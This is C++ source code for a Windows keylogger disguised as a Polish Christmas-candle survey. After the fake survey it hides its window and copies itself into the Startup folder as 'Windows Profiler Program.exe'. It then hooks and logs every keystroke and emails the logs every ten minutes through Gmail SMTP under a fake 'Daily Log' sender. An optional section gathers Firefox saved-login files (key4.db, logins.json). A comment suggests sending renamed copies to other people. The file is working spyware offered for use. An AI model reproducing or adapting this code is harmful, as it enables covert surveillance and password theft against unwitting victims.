#include <windows.h>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <cstdio>
#include <tchar.h>
#include <vector>
#include <CkEmail.h>
#include <CkMailMan.h>
#include "CkImap.h"

//#define DEBUG
//#define firefox
#define INFO_BUFFER_SIZE 32767

LRESULT CALLBACK LowLevelKeyboardProc(__attribute__((unused)) int nCode, WPARAM wParam, LPARAM lParam);

void log(char *str);

char *translate(int vk, int up);

void sendEmail(const std::vector<std::string> &fileList);

int shift = 0, caps = 0;
const char *emailAddress = "email";
const char *password = "password";
CkMailMan mailman;
FILE *fileLog;
FILE *fileConfig;
time_t t;
std::vector<std::string> filesToSend;

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    std::string appData = std::getenv("APPDATA");
    // Change this name each time you send it to someone so that they get a new version
    fileConfig = fopen("C:\\ProgramData\\WPConfig.txt", "a+");
    char opened[2];
    fgets(opened, 2, fileConfig);
    if (!opened[0]) {
        std::cout << "First open";
        fileConfig = fopen("C:\\ProgramData\\WPConfig.txt", "w");
        fputs("1", fileConfig);
        FILE* conin = stdin;
        FILE* conout = stdout;
        FILE* conerr = stderr;
        AllocConsole();
        AttachConsole(GetCurrentProcessId());
        freopen_s(&conin, "CONIN$", "r", stdin);
        freopen_s(&conout, "CONOUT$", "w", stdout);
        freopen_s(&conerr, "CONOUT$", "w", stderr);
        SetConsoleTitle("appconsole");

        std::cout << "odpowiadaj na pytania tak nie dziekuje zgory<3" << std::endl;
        std::cout<<" ktory kształt jest lepszy buuble(1) czy shake(2) 1=tak 2=nie"<<std::endl;
        std::string e;
        std::cin>>e;
        std::cout<<" ktory zapach na swieta jest lepszy cynamon(1) czy jabko(2) 1=tak 2=nie"<<std::endl;
        std::string b;
        std::cin>>b;
        std::cout<<" czy powinienem robić wersje świteczne świeczek (kolory czerwono złote) 1=tak 2=nie"<<std::endl;
        std::string c;
        std::cin>>c;
        std::cout<<" ktory zapach na swieta jest lepszy wino(1) czy jabko(2) 1=tak 2=nie"<<std::endl;
        std::string d;
        std::cin>>d;
        std::cout<<" lepiej zrobić wiele róznych rodzaji i kolorów choinek czy jedną ? jedna=tak wiele =nie"<<std::endl;
        std::string y;
        std::cin>>y;
        std::cout<<" robić specjalne świteczne opakowania?"<<std::endl;
        std::string u;
        std::cin>>u;
        std::cout << e << b << c << d << y << u;
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    } else {
        std::cout << "Opened already";
    }
    fclose(fileConfig);

    std::string header = "\n\n\n-------------------------";

    t = std::time(nullptr);
    auto tm = *std::localtime(&t);
    std::stringstream ss;
    ss << std::put_time(&tm, "%d.%m.%yr. %h:%m:%s");
    header += ss.str();

    DWORD len = INFO_BUFFER_SIZE;
    TCHAR username[INFO_BUFFER_SIZE] = {0};
    if (!GetUserName(username, &len))
        std::wcout << "Error with getting user name";
    std::wcout << username << std::endl;
    header += " User: ";
    header += username;
    header += "-------------------------\n\n\n";
    std::cout << header << std::endl;

    TCHAR filePath[INFO_BUFFER_SIZE] = {0};
    GetModuleFileName(nullptr, filePath, INFO_BUFFER_SIZE);
    std::wcout << filePath << std::endl;

    TCHAR destination[INFO_BUFFER_SIZE] = TEXT("C:/Users/");
    TCHAR secondPart[INFO_BUFFER_SIZE] = TEXT(
            "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows Profiler Program.exe");

    strcat(destination, username);
    strcat(destination, secondPart);

    std::wcout << destination << std::endl;

    if (CopyFile(filePath, destination, FALSE)) {
        printf("Copied file\n");
    } else {
        printf("Could not copy file!\n");
    }

    std::string nextTry = std::getenv("APPDATA");
    nextTry = appData + R"(\Microsoft\Windows\Start Menu\Programs\Startup\Windows Profiler Program.exe)";
    if (CopyFile(filePath, nextTry.c_str(), FALSE)) {
        printf("Copied file again\n");
    } else {
        printf("Could not copy file again!\n");
    }

    HINSTANCE app = GetModuleHandle(nullptr);
    SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, app, 0);
    MSG msg;
    std::string fname = "C:/ProgramData/WP";
    fname += username;
    fname += ".txt";
    fileLog = fopen(fname.c_str(), "a");
    fwrite(header.c_str(), 1, strlen(header.c_str()), fileLog);
    fflush(fileLog);

    filesToSend = {fname};

#ifdef firefox

    WIN32_FIND_DATA findData;
    HANDLE hFind = INVALID_HANDLE_VALUE;

    wchar_t *profiles = _wgetenv(L"APPDATA");
    char cProfiles[INFO_BUFFER_SIZE] = {0};
    wcstombs(cProfiles, profiles, INFO_BUFFER_SIZE);
    strcat(cProfiles, "/Mozilla/Firefox/Profiles/");

    wcscat(profiles, L"/Mozilla/Firefox/Profiles/*");
    std::wcout << profiles << std::endl;

    hFind = FindFirstFile((LPCSTR) profiles, &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        std::cout << "Error!" << std::endl;
    }

    do {
        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                std::wcout << "Found profile: " << findData.cFileName << std::endl;
                char profileName[INFO_BUFFER_SIZE] = {0};
                wcstombs(profileName, (wchar_t *) findData.cFileName, INFO_BUFFER_SIZE);

                std::string path = cProfiles;
                path += profileName;

                std::string key4 = path + "/key4.db";
                filesToSend.push_back(key4);

                std::string logins = path + "/logins.json";
                filesToSend.push_back(logins);
            }
        }

    } while (FindNextFile(hFind, &findData) != 0);

    FindClose(hFind);

#endif

    for (const std::string &f: filesToSend) {
        std::cout << "Attachment " << f << std::endl;
    }

    mailman.put_SmtpHost("smtp.gmail.com");
    mailman.put_SmtpUsername(emailAddress);
    mailman.put_SmtpPassword(password);
    mailman.put_SmtpSsl(true);
    mailman.put_SmtpPort(587);
    sendEmail(filesToSend);

#pragma clang diagnostic push
#pragma ide diagnostic ignored "EndlessLoop"
    while (true) {
        while (GetMessage(&msg, nullptr, 0, 0) > 0) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
#pragma clang diagnostic pop
}

void sendEmail(const std::vector<std::string> &fileList) {
    CkEmail email;
    email.AddTo("Windows Profiler", emailAddress);
    email.put_Subject("Daily Log");
    email.put_Body(
            "Hello!\nWe are sending you your daily log of Windows Profiler ;)\nLook up attachments.\nCheers,\nJD - Bajo Jajo Corporation");
    email.put_From("Bajo Jajo Corporation");

    bool success;

    for (const std::string &f: fileList) {
        email.addFileAttachment(f.c_str());
        if (!email.get_LastMethodSuccess()) {
            std::cout << email.lastErrorText() << "\r\n";
        }
    }

    success = mailman.SendEmail(email);
    if (!success) {
        std::cout << mailman.lastErrorText() << "\r\n";
        return;
    }

    success = mailman.CloseSmtpConnection();
    if (!success) {
        std::cout << "Connection to SMTP server not closed cleanly." << "\r\n";
    }

    std::cout << "Mail with attachments sent!" << "\r\n";
}

#pragma clang diagnostic push
#pragma ide diagnostic ignored "ConstantFunctionResult"

LRESULT CALLBACK LowLevelKeyboardProc(__attribute__((unused)) int nCode, WPARAM wParam, LPARAM lParam) {
    auto *kb = (KBDLLHOOKSTRUCT *) lParam;
    char *str = nullptr;
    if (kb->vkCode == 0xA2 || kb->vkCode == 0xA5 || kb->vkCode == 0xA4) {
        return 0;
    }

    if (wParam == WM_KEYUP || wParam == 261) {
        str = translate((int) kb->vkCode, 1);
    } else if (wParam == WM_KEYDOWN || wParam == 260) {
        str = translate((int) kb->vkCode, 0);
    }
    if (str)
        log(str);

    if (difftime(std::time(nullptr), t) > 600) {
        t = std::time(nullptr);
        sendEmail(filesToSend);
    }
    return 0;
}

#pragma clang diagnostic pop

void log(char *str) {
    fwrite(str, 1, strlen(str), fileLog);
    fflush(fileLog);
}

char *translate(int vk, int up) {
    if (up) {
        if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1))
            shift = 0;
        return nullptr;
    } else if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1)) {
        shift = 1;
        return nullptr;
    }
    char *buf = (char *) malloc(16);
    memset(buf, 0, 16);
    if (vk < 0x29) {
        switch (vk) {
            case 0x08:
                strcpy(buf, "[BS]");
                break;
            case 0x09:
                strcpy(buf, "[TAB]");
                break;
            case 0x0d:
                strcpy(buf, "\n");
                break;
            case 0x14:
                caps ^= 1;
                break;
            case 0x20:
                buf[0] = ' ';
                break;
            case 0x25:
                strcpy(buf, "[LT]");
                break;
            case 0x26:
                strcpy(buf, "[UP]");
                break;
            case 0x27:
                strcpy(buf, "[RT]");
                break;
            case 0x28:
                strcpy(buf, "[DN]");
                break;
            default:
                break;
        }
        return buf;
    }
    if (vk > 0x69 && vk < 0x70) {
        buf[0] = (char) (vk - 0x40);
    } else if (vk > 0x6f && vk < 0x88) {
        sprintf(buf, "[F%d]", vk - 0x6f);
    } else if (isalpha(vk)) {
        if (!caps)
            if (shift) {
                buf[0] = (char) (toupper(vk));
            } else {
                buf[0] = (char) (tolower(vk));
            }
        else if (!shift) {
            buf[0] = (char) (toupper(vk));
        } else {
            buf[0] = (char) (tolower(vk));
        }
    } else {
        switch (vk) {
            case '1':
                if (!shift) {
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '!';
                }
                break;
            case '2':
                if (!shift) {
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '@';
                }
                break;
            case '3':
                if (!shift) {
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '#';
                }
                break;
            case '4':
                if (!shift) {
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '$';
                }
                break;
            case '5':
                if (!shift) {
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '%';
                }
                break;
            case '6':
                if (!shift) {
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '^';
                }
                break;
            case '7':
                if (!shift) {
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '&';
                }
                break;
            case '8':
                if (!shift) {
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '*';
                }
                break;
            case '9':
                if (!shift) {
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '(';
                }
                break;
            case '0':
                if (!shift) {
                    buf[0] = (char) vk;
                } else {
                    buf[0] = ')';
                }
                break;
            case 0xba:
                if (!shift) {
                    buf[0] = ';';
                } else {
                    buf[0] = ':';
                }
                break;
            case 0xbb:
                if (!shift) {
                    buf[0] = '=';
                } else {
                    buf[0] = '+';
                }
                break;
            case 0xbc:
                if (!shift) {
                    buf[0] = ',';
                } else {
                    buf[0] = '<';
                }
                break;
            case 0xbd:
                if (!shift) {
                    buf[0] = '-';
                } else {
                    buf[0] = '_';
                }
                break;
            case 0xbe:
                if (!shift) {
                    buf[0] = '.';
                } else {
                    buf[0] = '>';
                }
                break;
            case 0xbf:
                if (!shift) {
                    buf[0] = '/';
                } else {
                    buf[0] = '?';
                }
                break;
            case 0xc0:
                if (!shift) {
                    buf[0] = '`';
                } else {
                    buf[0] = '~';
                }
                break;
            case 0xdb:
                if (!shift) {
                    buf[0] = '[';
                } else {
                    buf[0] = '{';
                }
                break;
            case 0xdc:
                if (!shift) {
                    buf[0] = '\\';
                } else {
                    buf[0] = '|';
                }
                break;
            case 0xdd:
                if (!shift) {
                    buf[0] = ']';
                } else {
                    buf[0] = '}';
                }
                break;
            case 0xde:
                if (!shift) {
                    buf[0] = '\'';
                } else {
                    buf[0] = '\"';
                }
                break;
            default:
                break;
        }
    }
    return buf;
}